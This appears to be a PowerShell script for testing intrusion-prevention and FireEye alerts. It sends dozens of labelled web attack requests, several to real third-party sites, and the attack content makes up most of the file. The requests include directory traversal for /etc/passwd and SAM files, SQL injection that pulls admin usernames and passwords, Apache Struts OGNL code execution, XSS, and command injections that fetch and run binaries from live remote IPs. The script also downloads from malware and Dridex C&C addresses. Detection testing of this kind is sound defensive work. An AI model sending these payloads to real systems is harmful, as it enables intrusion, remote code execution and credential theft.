$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials 


#For ($i=0; $i -le 10; $i++) {

#0234: HTTP: Nimda / Code Red / Code Blue Attack
wget "http://lorenanorton.com/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0361: HTTP: Protected File Access (/etc/passwd)
wget "http://lorenanorton.com/../../../../../../../../../etc/passwd" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0495: HTTP: Shell Command Execution (cmd.exe)
wget "http://lorenanorton.com/cmd.exe?/c%20dir" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0521: HTTP: webdist.cgi Command Execution Vulnerability
wget "http://lorenanorton.com//cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0542: HTTP: pals-cgi Code Execution or File Read
wget "http://lorenanorton.com/cgi-bin/pals-cgi?palsAction=restart&documentName=/etc/passwd" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0684: HTTP: aglimpse command exec
wget "http://lorenanorton.com/cgi-bin/aglimpse/80%7CIFS=5;CMD=5touch5/tmp/aglimpse-cgi-vulnerable;eval$CMD;echo" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0720: HTTP: Big Brother bb-hostsvc.sh Vulnerability
wget "http://lorenanorton.com/bb-hostsvc.sh?HOSTSVC=/../../../../../../../../etc/passwd" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0722: HTTP: campas CGI Vulnerability
wget "http://lorenanorton.com/campas?%0Acat%0Ac:%5Cboot.ini" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0723: HTTP: cached_feed.cgi Vulnerability
wget "http://lorenanorton.com/cgi-bin/cached_feed.pl?../../../../../../../.%20/etc/passwd" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0726: HTTP: commerce.cgi Vulnerability
wget "http://lorenanorton.com/login/commerce.cgi?page=../../../../../../windows/system32/drivers/etc/hosts%00index.html" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0737: HTTP: Hylafax faxsurvey Command Execution Vulnerability
wget "http://lorenanorton.com/cgi-bin/faxsurvey?/bin/cat%20/etc/passwd" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0780: HTTP: htmlscript Vulnerability
wget "http://lorenanorton.com/htmlscript?../../../../../../etc/passwd" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0790: HTTP: infosrch Vulnerability
wget "http://lorenanorton.com/cgi-bin/infosrch.cgi?cmd=getdoc&db=man&fname=%7C/bin/id" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0825: HTTP: apexec.pl Directory Traversal Vulnerability
wget "http://lorenanorton.com/cgi-bin/apexec.pl?etype=odp&template=../../../../../../../../../etc/passwd%00.html&passurl=/category/" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0845: HTTP: carbo.dll Information Disclosure 
wget "http://lorenanorton.com/carbo.dll?icatcommand=..\..\directory/filename.ext&amp;catalogname=catalog" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0870: HTTP: ftp.pl Directory Traversal Vulnerability
wget "http://lorenanorton.com/cgi-bin/ftp/ftp.pl?dir=../../../../../../etc" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0872: HTTP: Apache .htaccess Access
wget "http://lorenanorton.com/../../../public_html/.htaccess" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0883: HTTP: cal_make.pl Vulnerability
wget "http://lorenanorton.com/cgi-bin/cal_make.pl?p0=../../../../../../../../../etc/passwd" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0884: HTTP: perl.exe Access
wget http://lorenanorton.com/cgi-bin/perl.exe?%20-e%20%22print%20'MyHeaderField:%20Qualys%0D%0A%0D%0AQualysContent'%22 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0911: HTTP: Armada search.cgi Vulnerability
wget "http://lorenanorton.com/cgi-bin/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0927: HTTP: SWEditServlet.cgi Vulnerability
wget "http://lorenanorton.com/SWEditServlet?station_path=Z&publication_id=2043&template=../../../../../../../../boot.ini" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0948: HTTP: test-cgi Vulnerability
wget "http://lorenanorton.com/cgi-bin/test-cgi?/*" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0951: HTTP: rwwwshell.pl Access
wget "http://lorenanorton.com/rwwwshell.pl" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0970: HTTP: view-source Vulnerability
wget "http://lorenanorton.com/cgi-bin/view-source?../../../../../../../../../etc/passwd" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0983: HTTP: TalentSoft webplus Directory Traversal wget Exploit
wget "http://lorenanorton.com/cgi-bin/webplus?script=/../../../../etc/passwd" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0984: HTTP: TalentSoft webplus IP Address Exploit
wget http://lorenanorton.com/webplus?about -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0988: HTTP: webspirs Exploit
wget http://lorenanorton.com/webspirs.cgi?sp.nextform=../../../../../../../../../etc/passwd -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0990: HTTP: Webstore Exploit
wget http://lorenanorton.com/cgi-bin/web_store.cgi?page=../../../../../../../boot%00ini -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#0992: HTTP: whoisraw CGI Vulnerability
wget http://lorenanorton.com/cgi-bin/whois_raw.cgi?fqdn=%0Acat%0A/etc/passwd -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1007: HTTP: download.cgi Exploit
wget http://lorenanorton.com/download.cgi?f=../../../../../../etc/passwd -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1025: HTTP: cgiwrap Vulnerability
wget "http://lorenanorton.com/cgiwrap/%3CSCRIPT%3Ealert(document.domain)%3C/SCRIPT%3E" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1026: HTTP: cgiwrap Vulnerability
wget "http://lorenanorton.com/cgiwrap/%3Cimg%20src=javascript:alert(5253)%3E" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1086: HTTP: .asp Source Code Exploit
wget "http://lorenanorton.com/default.asp::$DATA" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1106: HTTP: IIS ..%5c Encoded \ in URI
wget "http://lorenanorton.com/itrax/sites/..%5C..%5CREPDFS%5CDataSheet-1128US.pdf" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1117: HTTP: %252f Double Encoded / in URI
wget "http://lorenanorton.com/struts/..%252f..%252f..%252f/WEB-INF/web.xml" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1125: HTTP: ../.. Directory Traversal
wget "http://www.lorenanorton.com/BOE/CMC/1310072317/PlatformServices/service/app/logoff.do?appKind=CMC&backContext=/admin&backUrl=/logon.faces?redirection.page=true&url=..%252F..%252F..%252FCMC&bttoken=null&bttoken=null" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1133: HTTP: /.... or /... Directory Traversal
wget "http://www.lorenanorton.com/.../en/work-at-here/employees/employees-login.html" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1173: HTTP: Windows sam._ File Access
wget "http://lorenanorton.com/..%5C..%5C..%5Cwinnt%5Crepair%5Csam._" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1276: HTTP: IIS %252e Unicode Encoded URI
wget "http://pixel.quantserve.com/pixel;r=2020097088;rf=0;a=p-bb5-6blQm-CI-;url=http%3A%2F%2Fwww.rotoworld.com%2Farticles%2Fnfl%2F83192%2F179%2Fmatchup-dolphins--texans%3Fls%3Droto%3Anfl%3Agnav;ref=http%3A%2F%2Fwww.rotoworld.com%2F;fpan=0;fpa=P0-724494696-1531668037499;ns=0;ce=1;qjs=1;qv=4c19192-20180628134937;cm=;je=0;sr=1920x1080x24;enc=n;dst=1;et=1540397220398;tzo=240;ogl=title.Matchup%3A%20Dolphins%20%40%20Texans%20-%20Rotoworld%252Ecom%2Ctype.article%2Cdescription.Matchup%3A%20Dolphins%20%40%20Texans%20-%20Rotoworld%252Ecom%2Cimage.http%3A%2F%2Fwww%252Erotoworld%252Ecom%2Fimages%2Fphotos%2FNFL%2FHOU%2F00NFL_Hopkins1_300%252Ejpg%2Curl.http%3A%2F%2Fwww%252Erotoworld%252Ecom%2Farticles%2Fnfl%2F83192%2F179%2Fmatchup-dolphins--texans%2Csite_name.Rotoworld%252Ecom" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1695: HTTP: .bat  Command Execution
wget "http://lorenanorton.com/test.bat?%7Ctype%20c:%5Cwindows%5Cwin.ini -TimeoutSec 5 -UserAgent" "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1726: HTTP: IIS .htw Source Disclosure
wget "http://lorenanorton.com/null.htw?CiWebHitsFile=/default.asp%20&CiRestriction=none&CiHiliteType=Full" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#1733: HTTP: IIS .htw Cross Site Scripting
wget "http://lorenanorton.com/null.htw?CiWebHitsFile=/default.htm&CiRestriction=%22%3Cscript%3Ealert(48209)%3C/script%3E%22" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#2199: HTTP: Cart32 Admin Info Disclosure
wget http://lorenanorton.com/Cart32.exe/expdate -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#2265: BitTorrent: .torrent File Request
wget "http://download.documentfoundation.org/libreoffice/stable/6.1.1/win/x86_64/LibreOffice_6.1.1_Win_x64.msi.torrent" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#3273: HTTP: AWStats Multiple Vulnerabilities
wget "http://lorenanorton.com/awstats.pl?configdir=%20%7C%20/usr/bin/w%20%7C" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget "http://lorenanorton.com/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

###3593: HTTP: SQL Injection (UNION)
wget "http://webmail.nscorp.com//NewsType.asp?SmallClass=%27%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20%27%27=%27" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget "http://www.lorenanorton.com/nscorphtml/pdf/Customers/ID/materials.pdf?CtgO=6347%20AND%201=1%20UNION%20ALL%20SELECT%201,NULL,'%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',table_name%20FROM%20information_schema.tables%20WHERE%202%3E1--/**/;%20EXEC%20xp_cmdshell('cat%20../../../etc/passwd')#" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#3630: HTTP: SQL Injection (Boolean Identity)
wget "http://maps.coj.net/coj/rest/services/DuvalMaps/duvalProperty_2012/MapServer//2/query?f=json&where=LNAMEOWNER%20%3D%20%27BECKNELL%20PROPERTIES%27%20AND%20LONGNAME%20%3D%20%27PRITCHARD%20ST.%2C%20JACKSONVILLE%20FL%27%20AND%20ADDRCITY%20%3D%20%27JACKSONVILLE%27%20AND%201%3D1&returnGeometry=true&spatialRel=esriSpatialRelIntersects&outFields=*&outSR=102100" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#3959: HTTP: Cross-Site Scripting (Cookie Manipulation)
wget "http://ptl-9632dca9-4eb1827e.libcurl.so/index.php?name=ha%3Ca%20onmouseover=%22alert(document.cookie)%22%3Exxs%20link%3C/a%3E%20:onmouseover,%20onmouseout,onmousemove,onclickcker" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#4270: HTTP: PHP Code Injection
wget "http://lorenanorton.com/counter/nl/ord/lang=english(1);system(%22$ENV%7BHTTP_X%7D%22);" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#5176: HTTP: SQL Injection Evasion (String Functions)
wget "http://www.lorenanorton.com/plus/search.php?keyword=as&typeArr[111%3D@%60%5C%27%60)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+%60%23@__admin%60+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@%60%5C%27%60+]=a" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#5250: HTTP: PHPmyAdmin Local File Inclusion
wget http://lorenanorton.com/css/phpmyadmin.css.php?GLOBALS[cfg][ThemePath]=/etc/passwd -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#5437: HTTP: Windows Executable Download Spoofing
wget http://clickonce.trnswrks.com/bpa/tcs-tdis/prod/BPA/csftpctl.ocx -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#5673: HTTP: SQL Injection (Boolean Identity)
wget "http://www.nscorp.com/nscorphtml/pdf/Customers/ID/materials.pdf?CtgO=6347%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#8032: HTTP: PHP Code Injection Evasion (Obfuscated)
wget "http://www.lorenanorton.com/content/nscorp/en.html?pageid=Search&qt=internships999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#10146: HTTP: Adobe ColdFusion Directory Traversal Vulnerability
wget "http://lorenanorton.com/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../../../../../../../../../boot.ini%00en" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#10562: HTTP: Malicious Embedded Font Download
wget "http://s-ec.bstatic.com/static/fonts/booking-iconset/92b1f20e084d61493b8fb90601eca2e388efa8c2.eot" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#11766: HTTP: Oracle Secure Backup validate_login Command Injection (ZDI-09-003)
wget "http://lorenanorton.com/login.php?attempt=1&uname=%00" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#13787: HTTP: Microsoft Internet Explorer localhost Protected Mode Bypass (ZDI-14-270)
wget "http://troybarbell.com/items-scroller-top.js" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#16775: HTTP: BitTorrent Site Access
wget "http://forum.bittorrent.com" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#19691: HTTP: Microsoft IIS Web Server Information Disclosure Vulnerability
wget "http://hbgrealty.appfolio.com/connect/%20" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#19804: HTTP:  Reflective Download Attack
wget "http://lorenanorton.com/link/click?lid=43700001542753195&ds_s_kwgid=58700000179453060&&ds_e_adid=79645889933168&&ds_url_v=2&ds_dest_url=https://www.cabelas.com/browse.cmd?categoryId=108093780&CQ_search=lew's&WT.srch=1&WT.tsrc=PPC&rid=20&WT.mc_id=[*EngineAccountType*]|[*Adgroup*]|USA&WT.z_mc_id1=[*TrackerID*]&msclkid=72142e52e8821477e3a7759f01068d1a" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#27718: HTTP: Avtech Multiple Devices Search.cgi Command Injection Vulnerability
wget "http://lorenanorton.com/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin"  -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#28534: HTTP: Joomla! CMS com_fields SQL Injection Vulnerability
wget "http://lorenanorton.com/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(null,concat(0x7e,database()),null)--" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#29068: HTTP: Apache Struts 2 Struts 1 Plugin Remote Code Execution Vulnerability
wget "http://lorenanorton.com//?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27QUALYS-STRUTS-370547%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#31936: HTTP: Dasan GPON Home Router Command Injection Vulnerability
wget "http://lorenanorton.com/GponForm/diag_Form?images/" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#31942: HTTP: D-Link DSL-2750B Command Injection Vulnerability
wget "http://lorenanorton.com/login.cgi?cli=aa%20aa%27;wget%20http://80.211.106.251/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#31942: HTTP: D-Link DSL-2750B Command Injection Vulnerability
wget http://lorenanorton.com/login.cgi?cli=aa%20aa%27;wget%20http://159.89wget .204.166/d%20-O%20-%3E%20/tmp/ds;sh%20/tmp/ds%27$ -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#32705: HTTP: phpMyAdmin Local File Inclusion Vulnerability
wget http://lorenanorton.com/index.php?target=db_sql.php%253f/../../../../../../windows/win.ini -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#32892: HTTP: OGNL Entity Usage in an HTTP URI
wget "www.lorenanorton.com/%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.addHeader(%27eresult%27%2c%27struts2_security_check%27))%7d/" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#}

#Doesnt trigger anything
wget "http://ptl-9632dca9-4eb1827e.libcurl.so/index.php?page=/var/www/fileincl../../../../../../../test_include.txt%00%00%00%00%00%00%00%00%00%00%00" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget "http://ptl-9632dca9-4eb1827e.libcurl.so/index.php?page=?page=https://assets.pentesterlab.com/test_include.txt" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget "http://ptl-9632dca9-4eb1827e.libcurl.so/index.php?page=https://assets.pentesterlab.com/test_include.txt" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget "http://ptl-9632dca9-4eb1827e.libcurl.so/index.php?name=a&comment=b&cmd=ipconfig&LANG=../../../../../../xampp/apache/logs/access.log%00" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget "http://ptl-9632dca9-4eb1827e.libcurl.so/index.php?name=ha<script>eval(String.fromCharCode(97,108,101,114,116,40,39,49,39,41,59))</script>cker" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"



###Snort & Converted Snort Rules for Tipping Point IPS###
#User-Agent Anomolous Non-Business Traffic
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Baidu Test"
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "WPScan"
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Synapse"
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "sqlmap"
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Python"
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "PycURL"
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Paros"
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "OpenVAS"
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Nmap"
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Nikto"
wget http://lorenanorton.com -TimeoutSec 5 -UserAgent "Kazehakase"



###FireEye###
#FireEye (Alert): Ransomware
wget "https://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" -TimeoutSec 5 -UserAgent "Ransomware (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#FireEye APT Attack Alert
wget "http://99999.1.c.canihazyour.host" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#FireEye MaliciousWebCryptoMiner
wget "www.ghostquest.net/haunted-georgia.html" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#FireEye (Alert): Should trigger FireEye, but I had suppressed the rule after it was a false positive
wget download.imgburn.com/SetupImgBurn_2.5.8.0.exe -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#FireEye (Alert): Exploit.Kit.FakeAV
wget "http://iosphonelocked.online/" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#FireEye (Riskware): Web Riskware Alerts - Adware.Coupons
wget "http://frontdoor1.coupons.com/fds/qptl.aspx?TmlojdTRCgeWxoKfpsxLWJckjEetdockRJvJXfSrRwCyEbeJAnxfPvQqk " -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#FireEye (Riskware): Web Riskware Alerts -  Adware.Mindspark
wget "http://ak.imgfarm.com/images/nocache/vicinio/installers/v2/222529105.TTAB02.1/nsis/907104-TTAB02.1/180816182020325/msniEasyPDFCombine/EasyPDFCombine.b3d896d53e3e4b598626d3f0e3415cea.exe " -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#FireEye (Riskware): Malware -  PUP.Spigot 
wget "http://www.springtechdld.com/download/?d=0&h=1&pnid=4&domain=hmyemailcenter.co&implementation_id=email_spt_&source=s-ccc1-lp0-bb8&adprovider=appfocus1&user_id=6aa3d27a-5336-4398-9706-27c59b779a24&dfn=My%20Email%20Center&spo=0&appname=My%20Email%20Center&appdesc=Search%20your%20favorite%20Email%20sites%20instantly%20from%20your%20home%20and%20new%20tab%20page!&ies=s,h&sso= HTTP/1.1" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#FireEye (IPS Event) also triggered by 3273: HTTP: AWStats Multiple Vulnerabilities

#FireEye (IPS Event): Oracle Secure Backup Administration Server login.php Command Injection 
wget "http://lorenanorton.com/login.php?attempt=1&uname=%00" -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"



#triggers web proxy, not FireEye from my case but originally saw in FireEye 
wget http://win-system-currupt-error1350.club/error-6555/ -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#mcafee web proxy catches as malware <tested successfully>
wget http://209.141.59.124/521.exe -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#Dridex download file disguised as fake update page; mcafee we proxy catches as malware <tested successfully>
wget http://four.sineadhollywoodnutt.com/ -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"

#Dridex beacon simulation (Feodo version D) to known C&C server
wget http://107.170.231.118:4143 -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
wget http://atomary.bit/en/ -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
